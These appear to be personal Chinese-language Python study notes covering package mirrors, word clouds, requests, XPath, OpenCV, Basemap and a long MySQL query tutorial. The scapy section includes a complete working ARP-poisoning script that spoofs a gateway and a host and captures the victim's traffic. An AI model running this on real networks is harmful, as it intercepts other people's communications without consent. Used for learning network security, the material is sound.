Python
==============

修改pip/conda的安装源
::

 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/
 conda config --set show_channel_urls yes

 新建pip/pip.ini
 [global]
 timeout = 6000
 index-url = https://pypi.tuna.tsinghua.edu.cn/simple
 trusted-host = pypi.tuna.tsinghua.edu.cn


词云
---------------

需要安装jieba、wordcloud
通过命令行直接生成词云的命令行::
 
 wordcloud_cli --text file_path.txt --imagefile wordcloud.png
 # 可以通过wordcloud_cli 进行更详细的调节，需要对文件分词，自带的分词效果较差
 # --fontfile path 支持中文
 # --mask file
 # --background white


通过jieba对中文分词处理::
 
 import jieba
 import wordcloud
 import matplotlib.pyplot as plt

 words = open(r'words.txt','rb').read().decode('utf-8')
 # print(words)
 cut_words = list(jieba.cut(words))
 cut_str = ' '.join(cut_words)
 print(cut_words)
 make = wordcloud.WordCloud(font_path=r'C:\Windows\Fonts\simkai.ttf')
 s = make.generate(cut_str)
 plt.imshow(s)
 plt.axis('off')
 plt.show()

requests
------------------

发送http请求::

 url = 'https://www.baidu.com'
 headers = {'user-agent':""}
 proxy = {"http":"89.17.37.218:52957"} # 使用代理
 response = requests.get(url,params={"wd":"中国"},proxies=proxy)
 # response.content 是原始页面的byte类型，没有解码
 # response.text 是requests 解码后的数据，解码方式是推测的，可能出错

 response = request.post(url,data) # post 请求

urllib 
-----------------------

|    urllib 可以导入request(最为常用)、response、parse

>>> proxy = request.ProxyHandler({"http":"192.122.132.1"})
    opener = request.build_opener(proxy)
    opener.open(url)
 
lxml(XPath)
-------------------

::

 //div  任意位置div

 /div   根节点查找

 *      匹配任意节点

 @*     匹配任意属性

 @      匹配某一属性  

 1. //input[@id="str"] 精确匹配
 2. //input[@class,"f"] 模糊匹配

在python中的导入

>>> from lxml import html
html.etree.parse() # 传入文件地址
html.etree.fromstring() # 传入字符串






scapy
-------------------------
模拟三次握手::
 
 windows查看端口 netstat
 
 send(),在第三层发送数据包，但没有接收功能
 sendp(),在第二层发送数据包，同样没有接收功能

 sr(),在第三层发送数据包，有接收功能
 sr1(),在第三层发送数据包，有接收功能，但只接收第一个包
 srloop(),在第三层工作,循环发包

 srp()、srp1()、srploop()与sr,sr1,srloop类似,只是工作在第二层
 开始模拟时需要设置防火墙规则，防止操作系统发送RST
 iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.233.1 -j DROP
 
 flags = 2 为SYN扫描，半开式扫描
 recv=sr1(IP(dst="192.168.233.1")/TCP(dport=10020,sport=7777,flags="S"))
 ack = recv.ack
 seq = recv.seq
 
 发送ACK(flag = 16),完成三次握手！
 send(IP(dst='192.168.233.1')/TCP(dport=10020,sport=7777,flags=16,seq=ack,ack=seq+1))

 flag为24（ACK = 16，PUSH = 8) 发送数据
 recv1 = sr(IP(dst='192.168.233.1')/TCP(dport=10020,sport=7777,flags=24,seq=ack,ack=seq+1)/"hi", multi=1, timeout=10)
 如果多次发送数据需要每次对获取的seq+1,然后令ack等于seq+1

 flags=17, FIN（1） + ACK（16），进行连接终结
 recv1=srp1(IP(dst='192.168.233.1')/TCP(dport=10020,sport=7777,seq=ack,ack=seq+1,flags=17))

arp投毒,抓包::

 from scapy.all import *
 import os
 import sys
 import threading
 import signal
 from scapy.layers.l2 import ARP, Ether

 def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print("restore target >>>>>>>")
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(),signal.SIGINT)
 def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
                               timeout=2,retry=10)
    a = 1
    for s,r in responses:
        print(s)
        print("$"*20)
        print(r)
        return r[Ether].src
 def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print("begin to ARP poison")
    while True:
        try:
            send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac)) # 欺骗主机
            send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac)) # 欺骗网关
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

    # print("stoped poison")
 if __name__ == '__main__':

    target_ip = '192.168.0.150'
    gateway_ip = '192.168.0.1'
    packet_count = 10
    conf.verb = 0
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)
    print(gateway_mac,target_mac)
    poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,
                                                                target_ip,target_mac))
    poison_thread.start()
    try:
        bpf_filter = "ip host %s"%target_ip
        packets_ = sniff(count=packet_count,filter=bpf_filter) # 抓包
        wrpcap("arp.pcap",packets_)
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac) # 恢复原先设置
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac) # 恢复原先设置

    poison_thread.join()

opencv
---------------------
opencv 安装

1. pip install opencv-python==3.4.2.16

2. pip install opencv-contrib-python==3.4.2.16

::
 
 # 读取图片
 cv2.imread(img_path)
 # 读取影像
 video = cv2.VideoCapture(0) # 0 读取本地摄像头
 ret,frame = video.read() # frame 是每一帧,ret 是读取成功与否标志
 cv2.waitKey(10) # 每帧的间隔时间为10 0xFF==27(Esc键)
 
 # 基本操作
 b,g,r = cv2.split(img) # 拆分通道
 cv2.merge((b,g,r)) # 合并通道
 img = cv2.copyMakeBorder(img,20,20,10,10,cv2.BORDER_REFLECT) # 边界填充
 img = cv2.resize(img,(0,0),fx=0.5,fy=0.5) # 重新调整大小
 img = cv2.addWeighted(img,0.5,img,0.6,0) # 图像按权重融合

 # 阈值操作
 ret,img = cv2.threshold(img,127,255,cv2.THRESH_BINARY) 
 
 # 图像平滑
 img = cv2.blur(img,(3,3),borderType=cv2.BORDER_REFLECT) # 均值滤波
 img = cv2.boxFilter(img,-1,(3,3),normalize=True) # 方框滤波 不标准化越界后赋值为255
 img = cv2.medianBlur(img,3) # 中值滤波
 img = cv2.GaussianBlur(img,(3,3),1) # 权重处理
 
 # 形态学操作
 img = cv2.erode(img,np.ones((5,5),dtype=np.uint8),iterations=1) # 腐蚀最大值,针对最大值
 img = cv2.dilate(img,np.ones((5,5),dtype=np.uint8),iterations=1) # 膨胀
 img = cv2.morphologyEx(img,cv2.MORPH_OPEN,np.ones((5,5),dtype=np.uint8)) # 先腐蚀再膨胀
 img = cv2.morphologyEx(img,cv2.MORPH_CLOSE,np.ones((5,5),dtype=np.uint8)) # 先膨胀再腐蚀
 img = cv2.morphologyEx(img,cv2.MORPH_GRADIENT,kernel) # 梯度 膨胀-腐蚀
 # 礼帽=原始输入-开运算结果; 黑帽=闭运算-原始输入

 # 梯度
 img = cv2.Sobel(img,-1,dx=1,dy=1,ksize=3) # sober算子
 img = cv2.Scharr(img,cv2.CV_64F,dx=0,dy=1) # 细节更为丰富
 img = cv2.Laplacian(img,-1,ksize=3) # 对噪音敏感

 # 边缘检测
 # canny 1.高斯滤波 2.梯度(sober) 3.非极大值抑制 4.双阈值检测
 img = cv2.Canny(img,100,120) # 双阈值: minvalue 100,maxvalue 120

 # 高斯金字塔
 img = cv2.pyrUp(img) # 上采样
 img = cv2.pyrDown(img) # 下采样

 # 图像轮廓
 img,contours,hierarchy = cv2.findContours(img,cv2.RETR_TREE,cv2.CHAIN_APPROX_SIMPLE)
 res = cv2.drawContours(img,contours,-1,(0,255,0),1) # 绘制轮廓
 area = cv2.contourArea(contours[0]) # 计算轮廓面积
 arcLen = cv2.arcLength(contours[0],True) # 计算周长
 res = cv2.approxPolyDP(contours[0],0.1*cv2.arcLength(contours[0],True),True) # 近似周长(点)
 x, y, w, h = cv2.boundingRect(contours[0]) # 外界矩形
 rec = cv2.rectangle(img,(x,y),(x+w,y+h),(0,255,0)) # 绘制矩形

 # 直方图
 res = cv2.calcHist([img],[0],None,[256],[0,256]) # 计算直方图
 mask[50:150,50:150] = 255 # 制作mask

 # SIFT
 cv2.xfeature2d.SIFT_create() # 构建sift
 kp = sift.detect(gray,None) # 检测
 img = cv2.drawKeypoints(gray,kp,img)
 kp,des = sift.compute(gray,kp) # 128维向量

 # 特征匹配
 bf = cv2.BFMatcher(crossCheck=True) # 蛮力匹配
 bf.match()

 # 背景建模
 # 1. 帧差法
 # 2. 混合高斯模型(GMM)

basemap
------------------
::

 projection
 # Albers Equal Area Projection
 # lat_1 is first standard parallel.
 # lat_2 is second standard parallel.
 # lon_0,lat_0 is central point
 m = Basemap(width=8000000,height=7000000, resolution='l',projection='aea', lat_1=40.,lat_2=60,lon_0=35,lat_0=50)
 m.drawcoastlines() # 海岸线
 m.drawcountries() # 国家界限
 m.drawparallels(np.arange(-80.,81.,20.)) # 纬线
 m.drawmeridians(np.arange(-180.,181.,20.)) # 经线
 m.drawgreatcircle(90,35,100,50,color="r") # 连接线
 m.bluemarble() # draw a NASA Blue Marble image as a map background.卫星背景
 m.shadedrelief() # draw a shaded relief image as a map background,阴影背景
 m.etopo() # 浮雕(背景)
 m.quiver(90,45,1,5,color='g') # 添加矢量箭头

modis download script
-----------------------------------

1. 安装python(https://www.python.org/downloads/)

2. 找到python的安装目录,在cmd下使用cd命令到进入该目录(Scripts),使用dir命令查看当前目录文件。如果存在pip.exe说明当前位置正确,然后安装所需模块(GDAL文件需要全路径),安装命令如下

::

 pip install GDAL-3.0.1-cp38-cp38-win_amd64.whl
 pip install pymodis

3. 运行下载脚本(down_modis.py为下载脚本,需要给出脚本的本地全路径,本示例仅有文件名)

::
  cd ..
  python down_modis.py

MySQL 语句
-----------------------------

-- 数据的准备
	-- 创建一个数据库
	create database python_test charset=utf8;

	-- 使用一个数据库
	use python_test;

	-- 显示使用的当前数据是哪个?
	select database();

	-- 创建一个数据表
	-- students表
	
	::

	    create table students(
	    id int unsigned primary key auto_increment not null,
	    name varchar(20) default '',
	    age tinyint unsigned default 0,
	    height decimal(5,2),
	    gender enum('男','女','中性','保密') default '保密',
	    cls_id int unsigned default 0,
	    is_delete bit default 0
	    );

	
	-- classes表
	
	::

	    create table classes (
	    id int unsigned auto_increment primary key not null,
	    name varchar(30) not null
	    );


-- 查询
	-- 查询所有字段
	-- select * from 表名;
	
	::

	 select * from students;
	 select * from classes;
	 select id, name from classes;

	-- 查询指定字段
	-- select 列1,列2,... from 表名;
	
	::

	 select name, age from students;

	-- 使用 as 给字段起别名
	-- select 字段 as 名字.... from 表名;
	
	::

	 select name as 姓名, age as 年龄 from students;

	-- select 表名.字段 .... from 表名;
	
	::

	 select students.name, students.age from students;

	-- 可以通过 as 给表起别名
	
	-- select 别名.字段 .... from 表名 as 别名;
	
	::

	 select students.name, students.age from students;
	 select s.name, s.age from students as s;

	-- 失败的select students.name, students.age from students as s;
	
	-- 消除重复行
	
	-- distinct 字段
	
    ::

     select distinct gender from students;



-- 条件查询

	-- 比较运算符
		-- select .... from 表名 where .....
		
		-- >
		
		-- 查询大于18岁的信息
		
		::

		 select * from students where age>18;
		 select id,name,gender from students where age>18;

		-- <
		
		-- 查询小于18岁的信息
		
		::

		 select * from students where age<18;

		-- >=
		
		-- <=
		
		-- 查询小于或者等于18岁的信息
		
		-- =
		
		-- 查询年龄为18岁的所有学生的名字
		
		::

		 select * from students where age=18;

		-- != 或者 <>


	-- 逻辑运算符
		-- and
		
		-- 18到28之间的所以学生信息
		::

		 select * from students where age>18 and age<28;

		-- 失败select * from students where age>18 and <28;


		-- 18岁以上的女性
		
		::
		
		 select * from students where age>18 and gender="女";
		 select * from students where age>18 and gender=2;


		-- or
		
		-- 18以上或者身高查过180(包含)以上
		
		::

		 select * from students where age>18 or height>=180;


		-- not
		
		-- 不在 18岁以上的女性 这个范围内的信息
		
		-- select * from students where not age>18 and gender=2;
		
		::

		 select * from students where not (age>18 and gender=2);

		-- 年龄不是小于或者等于18 并且是女性
		
		::

		 select * from students where (not age<=18) and gender=2;


	-- 模糊查询
		-- like 
		
		-- % 替换1个或者多个
		
		-- _ 替换1个
		
		-- 查询姓名中 以 "小" 开始的名字
		
		::

		 select name from students where name="小";
		 select name from students where name like "小%";

		-- 查询姓名中 有 "小" 所有的名字
		
		::

		 select name from students where name like "%小%";

		-- 查询有2个字的名字
		
		::

		 select name from students where name like "__";

		-- 查询有3个字的名字
		
		::

		 select name from students where name like "__";

		-- 查询至少有2个字的名字
		
		::

		 select name from students where name like "__%";


		-- rlike 正则
		
		-- 查询以 周开始的姓名
		
		::

		 select name from students where name rlike "^周.*";

		-- 查询以 周开始、伦结尾的姓名
		
		::

		 select name from students where name rlike "^周.*伦$";


	-- 范围查询
		-- in (1, 3, 8)表示在一个非连续的范围内
		
		-- 查询 年龄为18、34的姓名
		
		::

		 select name,age from students where age=18 or age=34;
		 select name,age from students where age=18 or age=34 or age=12;
		 select name,age from students where age in (12, 18, 34);


		
		-- not in 不非连续的范围之内
		
		-- 年龄不是 18、34岁之间的信息
		
		::

		 select name,age from students where age not in (12, 18, 34);


		-- between ... and ...表示在一个连续的范围内
		
		-- 查询 年龄在18到34之间的的信息
		
		::

		 select name, age from students where age between 18 and 34;


		-- not between ... and ...表示不在一个连续的范围内
		
		-- 查询 年龄不在在18到34之间的的信息
		
		::

		 select * from students where age not between 18 and 34;
		 select * from students where not age between 18 and 34;

		-- 失败的select * from students where age not (between 18 and 34);


	-- 空判断
		-- 判空is null
		
		-- 查询身高为空的信息
		
		::

		 select * from students where height is null;
		 select * from students where height is NULL;
		 select * from students where height is Null;

		-- 判非空is not null
		
		::

		 select * from students where height is not null;


-- 排序
	-- order by 字段
	
	-- asc从小到大排列，即升序
	
	-- desc从大到小排序，即降序

	-- 查询年龄在18到34岁之间的男性，按照年龄从小到到排序

	::

	 select * from students where (age between 18 and 34) and gender=1;
	 select * from students where (age between 18 and 34) and gender=1 order by age;
	 select * from students where (age between 18 and 34) and gender=1 order by age asc;


	-- 查询年龄在18到34岁之间的女性，身高从高到矮排序

	::

	 select * from students where (age between 18 and 34) and gender=2 order by height desc;


	-- order by 多个字段
	
	-- 查询年龄在18到34岁之间的女性，身高从高到矮排序, 如果身高相同的情况下按照年龄从小到大排序

	::

	 select * from students where (age between 18 and 34) and gender=2 order by height desc,id desc;


	-- 查询年龄在18到34岁之间的女性，身高从高到矮排序, 如果身高相同的情况下按照年龄从小到大排序,
	
	-- 如果年龄也相同那么按照id从大到小排序

	::

	 select * from students where (age between 18 and 34) and gender=2 order by height desc,age asc,id desc;


	-- 按照年龄从小到大、身高从高到矮的排序

	::

	 select * from students order by age asc, height desc;


-- 聚合函数
	-- 总数
	
	-- count
	
	-- 查询男性有多少人，女性有多少人

	::

	 select * from students where gender=1;
	 select count(*) from students where gender=1;
	 select count(*) as 男性人数 from students where gender=1;
	 select count(*) as 女性人数 from students where gender=2;


	-- 最大值
	
	-- max
	
	-- 查询最大的年龄

	::

	 select age from students;
	 select max(age) from students;

	-- 查询女性的最高 身高

	::

	 select max(height) from students where gender=2;

	-- 最小值
	-- min


	-- 求和
	-- sum
	
	-- 计算所有人的年龄总和

	::

	 select sum(age) from students;


	-- 平均值
	-- avg
	
	-- 计算平均年龄

	::

	 select avg(age) from students;


	-- 计算平均年龄 sum(age)/count(*)

	::

	 select sum(age)/count(*) from students;


	-- 四舍五入 round(123.23 , 1) 保留1位小数
	
	-- 计算所有人的平均年龄，保留2位小数

	::

	 select round(sum(age)/count(*), 2) from students;
	 select round(sum(age)/count(*), 3) from students;

	-- 计算男性的平均身高 保留2位小数

	::

	 select round(avg(height), 2) from students where gender=1;

	-- select name, round(avg(height), 2) from students where gender=1;

-- 分组

	-- group by
	-- 按照性别分组,查询所有的性别

	::

	 select name from students group by gender;
	 select * from students group by gender;
	 select gender from students group by gender;

	-- 失败select * from students group by gender;

	-- 计算每种性别中的人数

	::

	 select gender,count(*) from students group by gender;


	-- 计算男性的人数

	::

	 select gender,count(*) from students where gender=1 group by gender;


	-- group_concat(...)
	
	-- 查询同种性别中的姓名

 	::

 	 select gender,group_concat(name) from students where gender=1 group by gender;
 	 select gender,group_concat(name, age, id) from students where gender=1 group by gender;
 	 select gender,group_concat(name, "_", age, " ", id) from students where gender=1 group by gender;

	-- having
	
	-- 查询平均年龄超过30岁的性别，以及姓名 having avg(age) > 30

	::

	 select gender, group_concat(name),avg(age) from students group by gender having avg(age)>30;
	
	-- 查询每种性别中的人数多于2个的信息
	
	::

	 select gender, group_concat(name) from students group by gender having count(*)>2;



-- 分页
	-- limit start, count

	-- 限制查询出来的数据个数

	::

	 select * from students where gender=1 limit 2;

	-- 查询前5个数据

	::

	 select * from students limit 0, 5;

	-- 查询id6-10（包含）的书序

	::

	 select * from students limit 5, 5;


	-- 每页显示2个，第1个页面

	::

	 select * from students limit 0,2;

	-- 每页显示2个，第2个页面

	::

	 select * from students limit 2,2;

	-- 每页显示2个，第3个页面

	::

	 select * from students limit 4,2;

	-- 每页显示2个，第4个页面

	::

	 select * from students limit 6,2; -- -----> limit (第N页-1)*每个的个数, 每页的个数;

	-- 每页显示2个，显示第6页的信息, 按照年龄从小到大排序

	::

	 select * from students order by age asc limit 10,2;

	 select * from students where gender=2 order by height desc limit 0,2;



-- 连接查询
	-- inner join ... on

	-- select ... from 表A inner join 表B;

	::

	 select * from students inner join classes;

	-- 查询 有能够对应班级的学生以及班级信息

	::

	 select * from students inner join classes on students.cls_id=classes.id;

	-- 按照要求显示姓名、班级

	::

	 select students.*, classes.name from students inner join classes on students.cls_id=classes.id;
	 select students.name, classes.name from students inner join classes on students.cls_id=classes.id;

	-- 给数据表起名字

	::

	 select s.name, c.name from students as s inner join classes as c on s.cls_id=c.id;

	-- 查询 有能够对应班级的学生以及班级信息，显示学生的所有信息，只显示班级名称

	::

	 select s.*, c.name from students as s inner join classes as c on s.cls_id=c.id;

	-- 在以上的查询中，将班级姓名显示在第1列

	::

	 select c.name, s.* from students as s inner join classes as c on s.cls_id=c.id;

	-- 查询 有能够对应班级的学生以及班级信息, 按照班级进行排序
	
	-- select c.xxx s.xxx from student as s inner join clssses as c on .... order by ....;

	::

	 select c.name, s.* from students as s inner join classes as c on s.cls_id=c.id order by c.name;

	-- 当时同一个班级的时候，按照学生的id进行从小到大排序

	::

	 select c.name, s.* from students as s inner join classes as c on s.cls_id=c.id order by c.name,s.id;

	-- left join
	-- 查询每位学生对应的班级信息

	::

	 select * from students as s left join classes as c on s.cls_id=c.id;

	-- 查询没有对应班级信息的学生

	::

	 select * from students as s left join classes as c on s.cls_id=c.id having c.id is null;
	 select * from students as s left join classes as c on s.cls_id=c.id where c.id is null;

	-- right join   on
	-- 将数据表名字互换位置，用left join完成

-- 自关联

	-- 查询所有省份
	select * from areas where pid is null;

	-- 查询出山东省有哪些市
	
	::

	 select * from areas as province inner join areas as city on city.pid=province.aid having province.atitle="山东省";
	 select province.atitle, city.atitle from areas as province inner join areas as city on city.pid=province.aid having province.atitle="山东省";

	-- 查询出青岛市有哪些县城

	::

	 select province.atitle, city.atitle from areas as province inner join areas as city on city.pid=province.aid having province.atitle="青岛市";
	 select * from areas where pid=(select aid from areas where atitle="青岛市")


-- 子查询
	-- 标量子查询
	-- 查询出高于平均身高的信息

	-- 查询最高的男生信息

	::

	 select * from students where height = 188;
	 sselect * from students where height = (select max(height) from students);

	-- 列级子查询
	-- 查询学生的班级号能够对应的学生信息
	-- select * from students where cls_id in (select id from classes);

















